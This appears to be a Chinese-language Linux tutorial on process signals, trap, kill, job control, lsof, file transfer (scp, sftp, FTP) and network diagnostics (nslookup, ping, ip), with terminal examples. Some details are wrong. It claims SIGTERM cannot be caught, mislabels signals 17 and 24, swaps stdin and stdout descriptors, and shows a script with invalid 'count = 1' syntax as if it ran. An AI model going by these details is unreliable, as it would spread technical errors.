53) SIGRTMAX-11 54) SIGRTMAX-10 55) SIGRTMAX-9  56) SIGRTMAX-8  57) SIGRTMAX-7
58) SIGRTMAX-6  59) SIGRTMAX-5  60) SIGRTMAX-4  61) SIGRTMAX-3  62) SIGRTMAX-2
63) SIGRTMAX-1  64) SIGRTMAX

1) SIGHUP
本信号在用户终端连接(正常或非正常)结束时发出,通常是在终端的控制进程结束时,通知同一session内的各个作业,这时它们与控制终端不再关联
登录Linux时系统会分配给登录用户一个终端(Session),在这个终端运行的所有程序,包括前台进程组和后台进程组,一般都属于这个Session。当用户退出Linux登录时,前台进程组和后台有对终端输出的进程将会收到SIGHUP信号,这个信号的默认操作为终止进程,因此前台进程组和后台有终端输出的进程就会中止。对于与终端脱离关系的守护进程,这个信号用于通知它重新读取配置文件。

2) SIGINT
程序终止(interrupt)信号,在用户键入INTR字符(通常是Ctrl+C)时发出

3) SIGQUIT
和SIGINT类似,但由QUIT字符(通常是Ctrl+/)来控制,进程在因收到SIGQUIT退出时会产生core文件,在这个意义上类似于一个程序错误信号

4) SIGILL
执行了非法指令,通常是因为可执行文件本身出现错误,或者试图执行数据段,堆栈溢出时也有可能产生这个信号　　

5) SIGTRAP
由断点指令或其它trap指令产生,由debugger使用

6) SIGABRT
程序自己发现错误并调用abort时产生　

7) SIGBUS
非法地址,包括内存地址对齐(alignment)出错,eg:访问一个四个字长的整数,但其地址不是4的倍数

8) SIGFPE
在发生致命的算术运算错误时发出,不仅包括浮点运算错误,还包括溢出及除数为0等其它所有的算术的错误

9) SIGKILL
用来立即结束程序的运行,本信号不能被阻塞、处理和忽略

10) SIGUSR1
留给用户使用 　　

11) SIGSEGV
试图访问未分配给自己的内存,或试图往没有写权限的内存地址写数据

12) SIGUSR2
留给用户使用

13) SIGPIPE
Broken pipe

14) SIGALRM
时钟定时信号,计算的是实际的时间或时钟时间,alarm函数使用该信号

15) SIGTERM
程序结束(terminate)
信号,与SIGKILL不同的是该信号可以被阻塞和处理,通常用来要求程序自己正常退出,shell命令kill缺省产生这个信号
17) SIGCHLD
子进程结束时,父进程会收到这个信号

18) SIGCONT
让一个停止(stopped)
的进程继续执行,本信号不能被阻塞可以用一个handler来让程序在由stopped状态变为继续执行时完成特定的工作,如重新显示提示符

19) SIGSTOP
停止(stopped)进程的执行,它和terminate及interrupt的区别:该进程还未结束,只是暂停执行,本信号不能被阻塞,处理或忽略　　

20) SIGTSTP
停止进程的运行,但该信号可以被处理和忽略,用户键入SUSP字符时(通常是Ctrl-Z)发出这个信号

21) SIGTTIN
当后台作业要从用户终端读数据时,该作业中的所有进程会收到SIGTTIN信号. 缺省时这些进程会停止执行

22) SIGTTOU
类似SIGTTIN,但在写终端或修改终端模式时收到

23) SIGURG
有紧急数据或out-of-band数据到达socket时产生

24) SIGXCPU
超过CPU时间资源限制,这个限制可以由getrlimit/setrlimit来读取/改变

25) SIGXFSZ
超过文件大小资源限制

26) SIGVTALRM
虚拟时钟信号,类似于SIGALRM,但是计算的是该进程占用的CPU时间

27) SIGPROF
类似于SIGALRM/SIGVTALRM,但包括该进程用的CPU时间以及系统调用的时间

28) SIGWINCH
窗口大小改变时发出

29) SIGIO
文件描述符准备就绪,可以开始进行输入/输出操作

30) SIGPWR
Power failure

HUP(1)    挂起,通常因终端掉线或用户退出而引发
INT(2)    中断,通常因按下Ctrl+C组合键而引发
QUIT(3)   退出,通常因按下Ctrl+/组合键而引发
ABRT(6)   中止,通常因某些严重的执行错误而引发
ALRM(14)  报警,通常用来处理超时
TERM(15)  终止,通常在系统关机时发送

常用的Linux信号
CoreDump(核心转储):当程序运行过程中异常退出时,内核把当前程序在内存状况存储在一个core文件中,以便调试

编号 信号名称 缺省动作 描述
1 SIGHUP 终止(Terminate) 终止进程,挂起控制终端或进程
2 SIGINT 终止 键盘输入中断命令,一般是CTRL+C
3 SIGQUIT CoreDump 键盘输入退出命令,一般是CTRL+\
4 SIGILL CoreDump 非法指令
5 SIGTRAP CoreDump trap指令发出,跟踪的断点,一般调试用
6 SIGABRT CoreDump abort(3)发出的终止信号,异常结束
7 SIGBUS CoreDump 非法地址
8 SIGFPE CoreDump 浮点数异常
9 SIGKILL 终止 立即停止进程,不能捕获,不能忽略
10 SIGUSR1 终止 用户自定义信号1,像Nginx就支持USR1信号,用于重载配置,重新打开日志
11 SIGSEGV CoreDump 无效内存引用
12 SIGUSR2 终止 用户自定义信号2
13 SIGPIPE 终止 管道不能访问
14 SIGALRM 终止 时钟信号,alrm(2)发出的终止信号
15 SIGTERM 终止 终止信号,进程会先关闭正在运行的任务或打开的文件再终止,有时间进程在有运行的任务而忽略此信号。不能捕捉
16 SIGSTKFLT 终止 处理器栈错误
17 SIGCHLD 可忽略 子进程结束时,父进程收到的信号
18 SIGCONT 可忽略 让终止的进程继续执行
19 SIGSTOP 停止 停止进程,不能忽略,不能捕获
20 SIGSTP 停止 停止进程,一般是CTRL+Z
21 SIGTTIN 停止 后台进程从终端读数据
22 SIGTTOU 停止 后台进程从终端写数据
23 SIGURG 可忽略 紧急数组是否到达socket
24 SIGXCPU CoreDump 超出CPU占用资源限制
25 SIGXFSZ CoreDump 超出文件大小资源限制
26 SIGVTALRM 终止 虚拟时钟信号,类似于SIGALRM,但计算的是进程占用的时间
27 SIGPROF 终止 类似与SIGALRM,但计算的是进程占用CPU的时间
28 SIGWINCH 可忽略 窗口大小改变发出的信号
29 SIGIO 终止 文件描述符准备就绪,可以输入/输出操作了
30 SIGPWR 终止 电源失败
31 SIGSYS CoreDump 非法系统调用

缺少了32、33两个未知信号,从这里分界,前面31个信号是不可靠信号,后面的是可靠信号。当进程发生阻塞的时候(一下子发送很多信号),不可靠信号容易丢失。如何去验证呢？可以在2(不可靠信号)号信号和34(可靠进程)号信号屏蔽期间,不断向某个进程发送这两个信号,待解除屏蔽后,观察是否丢失。这里测试的时候要注意一下,9-SIGKILL 19-SIGSTOP 31 32 这4个信号是不能被捕获的,遍历以下所有信号就可以发现了。

Linux支持两种信号:
1、标准信号,编号1-31,称为非可靠信号(非实时),不支持队列,信号可能会丢失,比如发送多次相同的信号,进程只能收到一次,如果第一个信号没有处理完,第二个信号将会丢弃。
2、扩展信号,编号32-64,称为可靠信号(实时),支持队列,发多少次进程就可以收到多少次。

【 生成信号 】
1、中断进程
使用Ctrl+C组合键可以生成SIGINT信号,并将其发送给当前正在shell中运行的任意进程。运行一个通常需要很长时间才能完成的命令并按Ctrl+C组合键可以测试此操作
Ctrl+C组合键不会在监视器上生成任何输出,它只会停止当前在shell中运行的进程。sleep命令在指定的秒数之内暂停操作。
通常,命令提示符在计时器过期之前不会返回。在计时器过期之前按Ctrl+C组合键,可以使sleep命令提前终止

berlin75@LAPTOP-0KMQM01D /mnt/e/wamp64/www$ sleep 100
^C
berlin75@LAPTOP-0KMQM01D /mnt/e/wamp64/www$

2、 暂停进程
Ctrl+Z组合键生成SIGSTP信号,可以停止任何在shell中运行的进程。停止进程与终止进程不同,停止进程后程序任然留在内存中,能够从停止的地方继续运行

berlin75@LAPTOP-0KMQM01D /mnt/e/wamp64/www$ sleep 100
^Z
[2]+  Stopped                 sleep 100
berlin75@LAPTOP-0KMQM01D /mnt/e/wamp64/www$

方括号中的数字是shell分配的作业编号(jobnumber)。
shell以作业(job)形式引用shell中运行的每个进程,向每个作业分配唯一的作业编号。
它向第一个启动的进程分配作业编号1,向第二进程分配作业编号2,以此类推。
如果shell会话中有一个停止的作业,在退出shell时bash将发出警告。使用ps命令查看停止的作业:

berlin75@LAPTOP-0KMQM01D /mnt/e/wamp64/www$ ps -l
F S   UID   PID  PPID  C PRI  NI ADDR SZ WCHAN  TTY          TIME CMD
0 S  1000    31    30  0  80   0 -  4265 -      tty2     00:00:01 bash
0 T  1000   165    31  0  80   0 -  3489 -      tty2     00:00:00 sleep
0 R  1000   166    31  0  80   0 -  4271 -      tty2     00:00:00 ps

在S列(进程状态),ps命令将已停止作业的状态显示为T
如果想在停止作业仍处于活动状态时退出shell,只需要再次键入exit命令。shell将退出,并终止停止的作业。还有一种方法是知道停止作业的PID,使用kill命令发送SIGKILL信号来终止它

berlin75@LAPTOP-0KMQM01D /mnt/e/wamp64/www$ kill -9 165
[2]+  Killed                  sleep 100
berlin75@LAPTOP-0KMQM01D /mnt/e/wamp64/www$ ps -l
F S   UID   PID  PPID  C PRI  NI ADDR SZ WCHAN  TTY          TIME CMD
0 S  1000    31    30  0  80   0 -  4265 -      tty2     00:00:01 bash
0 R  1000   167    31  0  80   0 -  4271 -      tty2     00:00:00 ps

3、捕获信号
除了可以使脚本忽略信号之外,还可以在信号出现时捕获信号和执行其他命令。
trap命令可指定能够通过shell脚本监控和拦截的Linux信号。如果脚本收到trap命令中列出的信号,它将保护该信号不被shell处理,并在本地处理它。
trap命令格式:trap commands signals。在trap命令行中只需要列出希望shell执行的命令及希望捕获的信号列表(以空格分隔)。指定信号可以通过它们的数值或Linux信号名实现。

$ cat trap01.sh
#!/bin/bash
#trap "echo haha" SIGINT SIGTERM
trap "echo haha" 2 15
echo "this is a test program"
count=1
while [ $count -le 3 ]
do
  echo "loop #$count"
  sleep 10
  count=$[ $count+1 ]
done
echo "this is the end of the test program"

$ sh trap01.sh
this is a test program
loop #1
loop #2
loop #3
^Chaha
this is the end of the test program

当每次检测到SIGINT和SIGTERM信号时显示一个简单的文本消息。如果捕获到这些信号,在用户试图使用bash shell键盘Ctrl+C命令停止程序时,脚本将不受影响。每次使用Ctrl+C组合键时,脚本执行trap命令中指定的echo语句,而不是忽略信号并允许shell停止脚本

4、捕获脚本退出
除了在shell脚本中捕获信号之外,可以在shell脚本退出时捕获它们。这是一种在shell完成作业时执行命令的便捷方式。要捕获shell脚本退出,只需要向trap命令添加EXIT信号。

$ cat trap02.sh
#!/bin/bash
trap "echo Exit the shell script" exit
echo "this is a test program"
count = 1
while [ $count -le 3 ]
do
  echo "loop #$count"
  sleep 10
  count = $[ $count+1 ]
done
echo "this is the end of the test program"

$ sh trap02.sh
this is a test program
loop #1
loop #2
loop #3
^CExit the shell script

$ sh trap02.sh
this is a test program
loop #1
loop #2
loop #3
this is the end of the test program
Exit the shell script

当脚本到达常规退出点时,就会触发trap,shell将执行在trap命令行中指定的命令。
如果提前退出脚本,也能够捕获EXIT。使用Ctrl+C组合键发送SIGINT信号时,脚本退出,但是在脚本退出之前,shell将执行trap命令。

5、移除捕获
要移除捕获,使用破折号作为命令和想要恢复正常行为的信号列表。

$ cat trap03.sh
#!/bin/bash
trap "echo Exit the shell script" exit
echo "this is a test program"
count=1
while [ $count -le 3 ]
do
  echo "loop #$count"
  sleep 10
  count=$[ $count+1 ]
done
echo 'remove exit trap'
trap - exit
echo "this is the end of the test program"

$ sh trap03.sh
this is a test program
loop #1
loop #2
loop #3
remove exit trap
this is the end of the test program

信号捕获移除后,脚本将忽略信号,但如果在移除捕获之前收到信号,脚本仍将根据trap命令处理该信号。

6、 后台模式下运行脚本
使用ps命令,可以查看Linux系统上运行的进程。所有进程不在终端监视器上运行。这就是所谓的后台运行进程。在后台模式中,进程运行时与终端会话STDIN、STDOUT和STDERR无关。
通过命令行界面以后台模式运行shell界面,只需要在命令后加上一个&符号。
将&符号放在命令之后时,它将bashshell与命令相分离,并以独立的后台进程形式在系统上运行。
显示的一行类似:[1]  19555,方括号的数字是shell分配给后台的作业编号。后面的数字是LInux系统分配给进程的PID。所有Linux系统上运行的进程都必须有唯一的PID。
系统显示这些条目之后,将出现一个新的命令行界面提示符。执行的命令将以后模式安全运行。
这是,可以在提示符处输出新的命令,但是后台进程仍在运行,任然使用终端监视器显示STDOUT和STDERR消息。
后台进程结束时,在终端显示消息格式:
[1]+ Done       ./test
这表示作业编号和作业状态(Done),以及用于启动该作业的命令。

$ sh trap03.sh &
[1] 14939

$ this is a test program
loop #1
loop #2
^C
$ psLoop3
  PID TTY          TIME CMD
   31 tty2     00:00:01 bash
  168 tty2     00:00:00 ps
$ remove exit trap
this is the end of the test program

可以通过命令行提示符同时启动任何数量的后台作业。每次启动一个新作业时,Linux系统将分配一个新作业编号和一个PID。使用ps命令可以查看运行的所有脚本。

启动的每个后台进程都出现在ps命令的运行进程输出列表中。如果所有进程都在终端会中显示输出,那会变成一团糟。

注意ps命令的输出,每个后台进程都连接着一个终端会话(pts/0)终端。如果终端会话退出,则后台进程将退出。如果与终端相关联的后台程序正在运行,有些终端模拟器会发出警告,而有些则不会。如果希望在注销控制台后脚本继续以后太模式运行,则需要执行一些其他操作。

7、非控制台下运行脚本
有时需要从终端启动shell脚本,然后让脚本结束之前以后台模式运行,即使退出终端会话也是如此。
nohup命令运行另一个命令阻塞发送到进程的任何SIGHUP信号。这可以防止在退出终端会话时退出进程。
nohup命令格式:nohup test.sh &
nohupm命令将进程与终端断开,所以进程没有STDOUT和STDERR输出链接。为了接收命令生成的任何输出,nohup命令自动将STDOUT和STDERR消息冲向的到称为nohup.out的文件。nohup.out文件包含通常发送到终端监视器的所有输出。进程运行完成后,可以打开nohup.out文件查看输出结果。

【 发送信号一般有两种情况 】
一种是内核检测到系统事件,比如键盘输入CTRL+C会发送SIGINT信号。
另一种是通过系统调用kill命令来向一个进程发送信号

【 信号的处理 】
应用程序收到信号后有三种处理方式:忽略、默认、捕捉,进程收到一个信号后会检查对该信号的处理机制。
如果是SIG_IGN就忽略该信号,其中有两个信号不能忽略:SIGKILL及SIGSTOP
如果是SIG_DFT则会采用系统默认的处理动作,执行缺省操作,Linux对每种信号都规定了默认操作,通常是终止进程或忽略该信号;
如果给该信号指定了一个处理函数(捕捉)则会中断当前进程正在执行的任务,转而去执行该信号的处理函数,返回后再继续执行被中断的任务。

有些情况下不希望shell脚本在运行时被中断,比如shell脚本设为某一用户的默认shell,使这一用户进入系统后只能作某一项工作,如数据库备份,不希望用户使用ctrl+C之类便进入到shell状态做不希望做的事情,这便用到了信号处理。

让进程重启的3种写法
"kill -1 进程号"
"kill -HUP 进程号"
"kill -SIGHUP 进程号"

捕获信号
当按下Ctrl+C键或Break键在终端一个shell程序的执行过程中,正常程序将立即终止,并返回命令提示符。这可能并不总是可取的,可能最终留下了一堆临时文件,将不会清理。

捕获这些信号是很容易的,trap命令的语法如下:
$ trap commands signals
这里的命令commands可以是任何有效的Linux命令或一个用户定义的函数,信号可以是任意数量的信号,想来捕获的列表。

在shell脚本中的陷阱trap有三种常见的用途:
1、清理临时文件:
trap "rm -f $WORKDIR/work1$$ $WORKDIR/dataout$$; exit" 2
如果有人试图从终端中止程序,程序接收信号数为2,这两个文件work1$$和dataout$$将被自动删除,然后退出

$ trap "rm $WORKDIR/work1$$ $WORKDIR/dataout$$; exit" 1 2
1号信号产生挂断:有人故意挂断线路或线路被意外断开,如果该行被挂了或Ctrl+c键被按下,这些文件将被删除

用来捕获指定的命令如果包含一个以上的命令必须用引号括起来
如果想这种替代发生在收到信号1或2的时间可以把单引号内的命令:
$ trap 'rm $WORKDIR/work1$$ $WORKDIR/dataout$$; exit' 1 2

2、忽略信号:
通常要忽略的信号有四个,即:HUP,INT,QUIT,TSTP即信号1, 2, 3, 24
$ trap '' 2
$ trap "" 2 3                                      # 禁止ctrl+c
$ trap "" 1 2 3 24 或 trap "" HUP INT QUIT TSTP    # 列出的命令是空的使指定的中断信号被忽略
$ trap 1 2 3 24 或 trap HUP INT QUIT TSTP          # 省略第一个参数恢复默认值

如果忽略了一个信号,所有的子shell也忽略该信号。不过如果指定要采取的行动在收到的信号,所有的子shell仍然会在收到该信号的默认操作。

用stty -a可以列出中断信号与键盘的对应
分别执行上面的命令后,运行tail -f /etc/passwd,然后尝试用键盘中断,试试默认和忽略两种情况下有何不同

3、重置陷阱trap:
当改变了默认在收到信号后应采取的动作之后,省略第一个参数可以复位应采取的动作收到信号1或2返回默认
$ trap 1 2

脚本程序通常是以从上到下的顺序解释执行的,所以必须在想保护的那部分代码以前指定trap命令。

如果要重置某个信号的处理条件到其默认值,只需简单的将command设置为-
如果要忽略某个信号就把command设置为空字符串''
一个不带参数的trap命令将列出当前设置的信号及其行动的清单

Shell脚本执行时会产生三个伪信号(之所以称为伪信息,因这是shell自己产生,而非操作系统产生),通过使用trap 捕获这三个伪信号并输出信息对调试大有帮助
EXIT      从一个函数中退出或整个执行完毕
ERR       当一个命令执行不成功,返回非0状态时
DEBUG     脚本中每一条命令执行之前

</pre>

<h4>kill命令、killall命令</h4><pre>
kill命令发送信号给进程。

命令格式:
kill [-s sigspec | -n signum | -sigspec] pid | jobspec ...
kill -l [sigspec]

-s  # 信号名称
-n  # 信号编号
-l  # 打印编号1-31信号名称

kill命令用于终止某个指定PID的服务进程,格式为"kill [参数] [进程PID]"
killall命令用于终止某个指定名称的服务所对应的全部进程,格式为:"killall [参数] [进程名称]"
kill PID
killall processname

killall php
killall nginx
killall -9 bash

kill则有局限性,例如后台进程,守护进程等
一般不加参数kill是使用15(SIGTERM)来杀,这相当于正常停止进程,停止进程的时候会释放进程所占用的资源
kill -9发送的信号是SIGKILL即exit。exit信号不会被系统阻塞,所以kill -9能顺利杀掉进程,也可以使用kill发送其他信号给进程
kill -l        # 查看Linux/Unix的信号变量
kill -9 pid    # 强制结束进程

给一个进程发送终止信号:
kill -s SIGTERM pid
kill -n 15 pid
kill -15 pid
kill -TREM pid

</pre>

<h4>bash作业管理</h4><pre>
在后台运行进程:在命令行添加一个&,
如 cp file1 file2 &
如 sleep 60 &

暂停某个正在运行的程序:ctrl+z或发送信号17
但是程序会暂停,不会响应用户的操作

管理后台作业
jobs 查看当前运行的作业
bg控制一个进程或程序到后台运行,列出停止的或后台工作的Job; 恢复在后台停止的Job
fg控制一个进程或程序到前台运行,前台化最近的Job
Brings the most recent job in the foreground

如果在进行操作之前程序早就已经在前台运行了的话,要找回这个程序,先输入jobs查看要找回的程序左边的编号,再输入bg加编号
bg 1

php run.php &
只要在命令的尾部加上符号&,启动的进程就会成为"后台任务"。如果要让正在运行的"前台任务"变为"后台任务",可以先按ctrl+z,然后执行bg命令让最近一个暂停的"后台任务"继续执行,也可以输入fg回车转变为正常模式。

"后台任务"有两个特点:
继承当前session(对话)的标准输出(stdout)和标准错误(stderr),因此后台任务的所有输出依然会同步地在命令行下显示。
不再继承当前session的标准输入(stdin),无法向这个任务输入指令了。如果它试图读取标准输入就会暂停执行(halt)
可以看到"后台任务"与"前台任务"的本质区别只有一个:是否继承标准输入,所以执行后台任务的同时用户还可以输入其他命令。

</pre><textarea>$ vim &      # 后台运行vim
[1] 1676
$ bg         # 列出停止的或后台工作的Job
[1]+ vim &

[1]+  Stopped                 vim
$ ps aux     # 查看系统进程
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   8304   108 ?        Ss   Jun30   0:00 /init ro
root      1029  0.0  0.0   8304    76 tty2     Ss   Jun30   0:00 /init ro
berlin75  1030  0.0  0.0  15196  2648 tty2     S    Jun30   0:02 -bash
berlin75  1676  0.7  0.1  24196  5372 tty2     T    10:12   0:00 vim
berlin75  1677  0.0  0.0  15664  1840 tty2     R    10:13   0:00 ps aux
$ fg         # 前台化最近的Job
vim

</textarea><pre>
CLI不是系统的串行接口,可以在执行其他命令时给出系统命令。要启动一个进程到后台,追加一个"&"到命令后面。
sleep 60 &
ls

睡眠命令在后台运行,依然可以与计算机交互。除了不同步启动命令以外,最好把 '&' 理解成 ';'。
如果有一个命令将占用很多时间,想把它放入后台运行,只要在命令运行时按下ctrl-z,它就会停止。然后键入 bg 使其转入后台。fg 命令可使其转回前台。
sleep 60
ctrl+z
bg
fg

可以使用 ctrl-c 来杀死一个前台进程

</pre>

<h4>lsof命令</h4><pre>
lsof命令用于查看进程开打的文件,打开文件的进程,进程打开的端口(TCP、UDP),找回/恢复删除的文件,是十分方便的系统监视工具,因为lsof命令需要访问核心内存和各种文件,所以需要root用户执行。

在linux环境下任何事物都以文件的形式存在,通过文件不仅仅可以访问常规数据,还可以访问网络连接和硬件,所以如传输控制协议(TCP)和用户数据报协议(UDP)套接字等,系统在后台都为该应用程序分配了一个文件描述符,无论这个文件的本质如何,该文件描述符为应用程序与基础操作系统之间的交互提供了通用接口。因为应用程序打开文件的描述符列表提供了大量关于这个应用程序本身的信息,因此通过lsof工具能够查看这个列表对系统监测以及排错将是很有帮助的

lsof(选项)
-a:列出打开文件存在的进程;
-c<进程名>:列出指定进程所打开的文件;
-g:列出GID号进程详情;
-d<文件号>:列出占用该文件号的进程;
+d<目录>:列出目录下被打开的文件;
+D<目录>:递归列出目录下被打开的文件;
-n<目录>:列出使用NFS的文件;
-i<条件>:列出符合条件的进程。(4、6、协议、:端口、 @ip )
-p<进程号>:列出指定进程号所打开的文件;
-u:列出UID号进程详情;
-h:显示帮助信息;
-v:显示版本信息。

lsof输出各列信息的意义如下:
COMMAND:进程的名称
PID:进程标识符
PPID:父进程标识符(需要指定-R参数)
USER:进程所有者
PGID:进程所属组
FD:文件描述符,应用程序通过文件描述符识别该文件。

文件描述符列表:
cwd:表示current work dirctory,即应用程序的当前工作目录,这是该应用程序启动的目录,除非它本身对这个目录进行更改
txt:该类型的文件是程序代码,如应用程序二进制文件本身或共享库,如上列表中显示的/sbin/init程序
lnn:library references(AIX);
er:FD information error(see NAME column);
jld:jail directory(FreeBSD);
ltx:shared library text(code and data);
mxx :hex memory-mapped type number xx.
m86:DOS Merge mapped file;
mem:memory-mapped file;
mmap:memory-mapped device;
pd:parent directory;
rtd:root directory;
tr:kernel trace file(OpenBSD);
v86  VP/ix mapped file;
0:表示标准输出
1:表示标准输入
2:表示标准错误

一般在标准输出、标准错误、标准输入后还跟着文件状态模式:
u:表示该文件被打开并处于读取/写入模式。
r:表示该文件被打开并处于只读模式。
w:表示该文件被打开并处于只写模式。
空格:表示该文件的状态模式为unknow,且没有锁定。
-:表示该文件的状态模式为unknow,且被锁定。

同时在文件状态模式后面,还跟着相关的锁:
N:for a Solaris NFS lock of unknown type;
r:for read lock on part of the file;
R:for a read lock on the entire file;
w:for a write lock on part of the file;(文件的部分写锁)
W:for a write lock on the entire file;(整个文件的写锁)
u:for a read and write lock of any length;
U:for a lock of unknown type;
x:for an SCO OpenServer Xenix lock on part      of the file;
X:for an SCO OpenServer Xenix lock on the      entire file;
space:if there is no lock.

文件类型:
DIR:表示目录。
CHR:表示字符类型。
BLK:块设备类型。
UNIX: UNIX域套接字。
FIFO:先进先出(FIFO)队列。
IPv4:网际协议(IP)套接字。
DEVICE:指定磁盘的名称
SIZE:文件的大小
NODE:索引节点(文件在磁盘上的标识)
NAME:打开文件的确切名称

1、lsof -i:端口号
2、netstat -tunlp|grep 端口号
都可以查看指定端口被哪个进程占用的情况

</pre>

<h4>scp命令</h4><pre>
在本地主机和远程主机之间或两台远程主机之间传输文件。

scp source_file user@host:directory/target_file  # 从本地主机复制到远程主机
scp user@host:directory/source_file target_file  # 从远程主机复制到本地主机
scp -r user@host:directory/source_folder farget_folder
scp -P port user@host:directory/source_file target_file  # -P选项可用于连接到特定的端口

文件传输协议FTP、SFTP和SCP
网络通信协议分层
应用层:
HTTP(Hypertext Transfer Protocol 超文本传输协议,显示网页)
DNS(Domain Name System)
FTP(File Transfer Protocol)
SFTP(SSH File Transfer Protocol,和FTP不一样)
SCP(Secure copy,based on SSH)
SSH (Secure Shell)
通信层:
TCP(Transmission Control Protocol 三次握手传输协议)
UDP
网络层:
IP(Internet Protocol)
ICMP(Internet Control Message Protocol,主要用于路由发送错误报告)
链接层:
MAC(media access control)

FTP(File Transfer Protocol)是TCP/IP网络上两台计算机传送文件的协议,FTP是在TCP/IP网络和INTERNET上最早使用的协议之一,它属于网络协议组的应用层。FTP客户机可以给服务器发出命令来下载文件,上载文件,创建或改变服务器上的目录。相比于HTTP,FTP协议要复杂得多。复杂是因为FTP协议要用到两个TCP连接,一个是命令链路,用来在FTP客户端与服务器之间传递命令;另一个是数据链路,用来上传或下载数据。FTP是基于TCP协议的,因此iptables防火墙设置中只需要放开指定端口(21 + PASV端口范围)的TCP协议即可。

FTP工作模式:
PORT(主动)方式的连接过程是:客户端向服务器的FTP端口(默认是21)发送连接请求,服务器接受连接,建立一条命令链路。当需要传送数据时,客户端在命令链路上用PORT命令告诉服务器:"我打开了一个1024+的随机端口,你过来连接我"。于是服务器从20端口向客户端的1024+随机端口发送连接请求,建立一条数据链路来传送数据。
PASV(Passive被动)方式的连接过程是:客户端向服务器的FTP端口(默认是21)发送连接请求,服务器接受连接,建立一条命令链路。当需要传送数据时,服务器在命令链路上用PASV命令告诉客户端:"我打开了一个1024+的随机端口,你过来连接我"。于是客户端向服务器的指定端口发送连接请求,建立一条数据链路来传送数据。
PORT方式,服务器会主动连接客户端的指定端口,那么如果客户端通过代理服务器链接到internet上的网络的话,服务器端可能会连接不到客户端本机指定的端口,或者被客户端、代理服务器防火墙阻塞了连接,导致连接失败。PASV方式,服务器端防火墙除了要放开21端口外,还要放开PASV配置指定的端口范围。

SFTP(Secure File Transfer Protocol):安全文件传送协议。可以为传输文件提供一种安全的加密方法。SFTP与 FTP有着几乎一样的语法和功能。SFTP为SSH的一部份,是一种传输文件到服务器的安全方式。在SSH软件包中,已经包含了一个叫作SFTP(Secure File Transfer Protocol)的安全文件传输子系统,SFTP本身没有单独的守护进程,它必须使用sshd守护进程(端口号默认是22)来完成相应的连接操作,所以从某种意义上来说,SFTP并不像一个服务器程序,而更像是一个客户端程序。SFTP同样是使用加密传输认证信息和传输的数据,所以,使用SFTP是非常安全的。但由于这种传输方式使用了加密/解密技术,所以传输效率比普通的FTP要低得多,如果对网络安全性要求更高时可以使用SFTP代替FTP。

登陆远程主机:
sftp user@host
针对本机的命令都加上l:
lcd,lpwd
将本机文件上传到远程:
put filename.txt [some/directory]
将当前文件夹下的文件上传到远程:
mput *.* // multiple
下载远程文件到本地:
get filename.file [some/directory]
下载目录下所有远程文件到本地:
mget *.* [some/directory]
帮助:
?
退出:
bye/exit/quit

SCP(Secure Copy):SCP就是Secure copy,是用来进行远程文件复制的,并且整个复制过程是加密的。数据传输使用ssh,并且和使用和ssh相同的认证方式,提供相同的安全保证。

拷贝本地文件到远程:
scp filename.txt user@host:some/directory
拷贝本地文件到远程,使用指定端口:
scp -P 2234 filename.txt user@host:some/directory
拷贝多个文件到远程home:
scp filename1.txt filename2.txt user@host:~
拷贝远程文件到本地:
scp user@host:directory/filename.txt  /directory
拷贝远程文件夹到本地:
scp -r user@host:directory/folder  .
拷贝远程文件到远程:
scp user@host1:directory/filename.txt  user@host1:directory

比较:
FTP 基于TCP来传输文件,明文传输用户信息和数据。
SFTP 基于SSH来加密传输文件,可靠性高,可断点续传。
SCP 是基于SSH来加密拷贝文件,但要知道详细目录,不可断点续传。

</pre>

<h3>系统状态检测命令</h3>
<h4>nslookup命令</h4><pre>
nslookup用于查询DNS的记录,查询域名解析是否正常,在网络故障时用来诊断网络问题

nslookup domain [dns-server]
如果没有指定dns服务器,就采用系统默认的dns服务器。

$ nslookup
> sohu.com
Server:         192.168.43.1
Address:        192.168.43.1#53

Non-authoritative answer:
Name:   sohu.com
Address: 221.179.177.36
Name:   sohu.com
Address: 123.125.116.28
Name:   sohu.com
Address: 220.181.90.52

查询其他记录
nslookup -qt = type domain [dns-server]
type:
A -->地址记录
AAAA   -->地址记录
AFSDB Andrew    -->文件系统数据库服务器记录
ATMA -->ATM地址记录
CNAME   -->别名记录
HINHO  -->硬件配置记录,包括CPU、操作系统信息
ISDN   -->域名对应的ISDN号码
MB   -->存放指定邮箱的服务器
MG    -->邮件组记录
MINFO   -->邮件组和邮箱的信息记录
MR   -->改名的邮箱记录
MX   -->邮件服务器记录
NS  --> 名字服务器记录
PTR    ->反向记录
RP    -->负责人记录
RT  -->路由穿透记录
SRV    -->TCP服务器信息记录
TXT   -->域名对应的文本信息
X25  -->域名对应的X.25地址记录

</pre>

<h4>ping命令</h4><pre>
主要用于测试网络连通,通过对目标机器发送数据包来测试两台主机是否连通及延时情况
$ ping www.baidu.com
$ ping locez.com      # 通过域名ping,若DNS未设置好,可能无法ping通
$ ping 211.157.2.94   # 通过IP地址ping,若无法ping通可能是网络连接出现问题

</pre>

<h4>ip指令</h4><pre>
ip地址管理
    1.显示ip地址
        ip a
        ip address show
        ip addr show dev eth0
        ip a sh eth0
    2.增加删除地址
        ip address add 192.0.2.1/24 dev eth0
        ip addr del 192.0.2.2/24 dev eth0
    3.显示接口统计
        ip -s link ls eth0
网卡和链路配置
    4.显示链路
        ip link show         #显示链路
        ip link sh eth0
    4.修改接口状态
        ip link set eth0 up
        ip link s gre01 down
路由表管理
    5.显示路由表
        ip route
        ip ro show dev gre01
    6.增加新路由
        ip route add 10.2.2.128/27 dev gre01
    7.增加默认路由
        ip route add default via 192.168.1.1
    8.修改默认路由
        ip route chg default via 192.168.1.2
    9.删除默认路由
        ip route del default
隧道配置
    10.增加删除GRE隧道
        ip tunnel add gre01 mode gre local 10.1.1.1 remote 20.2.2.1 ttl 255
        ip tunnel del gre01
    11.IPIP隧道
        ip tunl a ipip01 mode ipip local 10.1.1.1 remote 20.2.2.1 ttl 255
    12.显示隧道
        ip tunnel show
    13.显示隧道统计
        ip -s tunl ls gre01
邻居和arp表管理
    13.查看arp表
        ip neigh show
    14.手工增加删除arp项
        ip neighbor add 10.2.2.2 dev eth0
        ip neigh del 10.2.2.1 dev eth0
socket统计
    15.显示当前监听
        ss -l
    15.显示当前监听的进程
        ss -p

#ip常用命令
ip link show     #显示链路
ip addr show     #显示地址(或ifconfig)
ip route show    #显示路由(route -n)
ip neigh show    #显示arp表(ping 192.168.95.50,如果主机在同一局域网内直接加到arp表)
ip neigh delete 192.168.95.50 dev eth0   #删除arp条目,条目仍然存在状态为stale,下次通信需要确认
ip rule show                    #显示缺省规则
ip route del default dev eth0   #删除接口路由
